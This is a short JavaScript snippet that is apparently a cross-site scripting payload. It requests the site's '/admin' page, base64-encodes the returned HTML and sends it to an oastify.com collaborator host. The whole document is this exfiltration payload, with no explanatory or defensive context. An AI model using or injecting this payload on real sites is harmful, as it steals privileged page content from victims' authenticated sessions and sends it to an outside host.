fetch('/admin')
  .then(r => r.text())
  .then(html => {
    fetch('https://1wymobzbbtng60yvy0nmdy1k5bb2ztphe.oastify.com/?admin=' + btoa(html));
  });
